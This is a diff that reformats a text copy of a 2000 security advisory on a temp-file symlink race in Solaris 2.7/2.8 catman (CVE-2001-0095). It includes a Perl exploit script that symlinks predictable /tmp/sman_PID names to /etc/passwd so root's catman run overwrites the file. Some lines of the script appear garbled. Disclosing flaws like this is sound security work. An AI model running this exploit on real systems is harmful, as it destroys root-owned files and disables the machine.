@@ -1,78 +1,85 @@
-                                Advisory #: 39
-Title: Solaris 2.7/2.8 catman Temp File Vulnerability
-Author:Larry W. Cashdollar, @_larry0
-Date: 2000-12-18
-Download Site: www.oracle.com
-Vendor:Oracle Systems
-Vendor Notified: 2000-11-23
-Vendor Contact:
-Description: Through the use of symlinking temporary files created by /usr/bin/
-catman upon execution by root a local user can clobber root owned files.
-Vulnerability:
-The catman command creates preformatted versions of the online manual. It also
-creates the windex database for utilities like apropos and whatis. The problem
-lies with catman creating a temporary file in /tmp, the file has the form of /
-tmp/sman_pidofcatman. An attacker can monitor the process list for the
-execution of catman and create a symlink to a root owned file. catman will upon
-execution overwrite the contents of that file. This is a new bug for catman and
-is not addressed in the current patch cluster for Solaris 2.7 Sparc.
-CVE-2001-0095
-JSON:Export
-Exploit Code:
-   1. #!/usr/local/bin/perl -w
-   2. # The problem is catman creates files in /tmp insecurly. They are based
-      on the
-   3. # PID of the catman process, catman will happily clobber any files that
-      are
-   4. # symlinked to that file.
-   5. # The idea of this script is to create a block of symlinks to the target
-      file # with the current PID as a starting point. Depending on what load
-      your # system has this creates 1000 files in /tmp as sman_$currentpid +
-      1000.
-   6. # The drawback is you would have to know around when root would be
-      executing
-   7. # catman.
-   8. # A better solution would be to monitor for the catman process and create
-      the
-   9. # link before catman creates the file. I think this is a really small
-      window
-  10. # however. This worked on a patched Solaris 2.7 box (August 2000 patch #
-      cluster)
-  11. # SunOS rootabega 5.7 Generic_106541-12 sun4u sparc SUNW,Ultra-1
-  12. # 11/21/2000 Vapid Labs.
-  13. # http://vapid.dhs.org
-  14. $clobber = "/etc/passwd";
-  15. #file to clobber $X=getpgrp();
-  16. $Xc=$X;
-  17. #Constant
-  18. $Y=$X+1000;
-  19. #Constant
-  20. while($X < $Y) {
-  21. print "Linking /tmp/sman_$X to $clobber :";
-  22. # Change $clobber to what you want to clobber.
-  23. if (symlink ($clobber, "/tmp/sman_$X")) {
-  24. print "Sucess\n";
-  25. } else
-  26. {
-  27. print "failed, Busy system?\n";
-  28. }
-  29. $X=$X+1;
-  30. }
-  31. #Watch /tmp and see if catman is executed in time.
-  32. while(1) {
-  33. $list = "/usr/bin/ls -l /tmp | grep sman|grep root |";
-  34. open (list,$list) or "die cant open ls...\n";
-  35. while() {
-  36. @args = split "_",$_;
-  37. chop ($args[1]);
-  38. if ($args[1] >= $Xc && $args[1] <= $Y)
-  39. {
-  40. print "Looks like pid $args[1] is the winner\n cleaning....\n";
-  41.  `/usr/bin/rm -f /tmp/sman*`;
-  42. exit(1);
-  43. }
-  44. }
-  45. }
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/
-solaris_2.7_2.8_catman_race_condition_vulnerability.html
+
+                               Advisory #: 39
+
+   Title: Solaris 2.7/2.8 catman Temp File Vulnerability
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2000-12-18
+   Download Site: www.oracle.com
+   Vendor: Oracle Systems
+   Vendor Notified: 2000-11-23
+   Vendor Contact:
+   Description: Through the use of symlinking temporary files created by
+   /usr/bin/catman upon execution by root a local user can clobber root
+   owned files.
+   Vulnerability:
+   The catman command creates preformatted versions of the online manual.
+   It also creates the windex database for utilities like apropos and
+   whatis. The problem lies with catman creating a temporary file in /tmp,
+   the file has the form of /tmp/sman_pidofcatman. An attacker can monitor
+   the process list for the execution of catman and create a symlink to a
+   root owned file. catman will upon execution overwrite the contents of
+   that file. This is a new bug for catman and is not addressed in the
+   current patch cluster for Solaris 2.7 Sparc.
+   CVE-2001-0095
+   JSON: Export
+   Exploit Code:
+
+    1. #!/usr/local/bin/perl -w
+    2. # The problem is catman creates files in /tmp insecurly. They are
+       based on the
+    3. # PID of the catman process, catman will happily clobber any files
+       that are
+    4. # symlinked to that file.
+    5. # The idea of this script is to create a block of symlinks to the
+       target file # with the current PID as a starting point. Depending
+       on what load your # system has this creates 1000 files in /tmp as
+       sman_$currentpid + 1000.
+    6. # The drawback is you would have to know around when root would be
+       executing
+    7. # catman.
+    8. # A better solution would be to monitor for the catman process and
+       create the
+    9. # link before catman creates the file. I think this is a really
+       small window
+   10. # however. This worked on a patched Solaris 2.7 box (August 2000
+       patch # cluster)
+   11. # SunOS rootabega 5.7 Generic_106541-12 sun4u sparc SUNW,Ultra-1
+   12. # 11/21/2000 Vapid Labs.
+   13. # http://vapid.dhs.org
+   14. $clobber = "/etc/passwd";
+   15. #file to clobber $X=getpgrp();
+   16. $Xc=$X;
+   17. #Constant
+   18. $Y=$X+1000;
+   19. #Constant
+   20. while($X < $Y) {
+   21. print "Linking /tmp/sman_$X to $clobber :";
+   22. # Change $clobber to what you want to clobber.
+   23. if (symlink ($clobber, "/tmp/sman_$X")) {
+   24. print "Sucess\n";
+   25. } else
+   26. {
+   27. print "failed, Busy system?\n";
+   28. }
+   29. $X=$X+1;
+   30. }
+   31. #Watch /tmp and see if catman is executed in time.
+   32. while(1) {
+   33. $list = "/usr/bin/ls -l /tmp | grep sman|grep root |";
+   34. open (list,$list) or "die cant open ls...\n";
+   35. while() {
+   36. @args = split "_",$_;
+   37. chop ($args[1]);
+   38. if ($args[1] >= $Xc && $args[1] <= $Y)
+   39. {
+   40. print "Looks like pid $args[1] is the winner\n cleaning....\n";
+   41. `/usr/bin/rm -f /tmp/sman*`;
+   42. exit(1);
+   43. }
+   44. }
+   45. }
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/solaris_2.7_2.8_catman_race_conditi
+   on_vulnerability.html
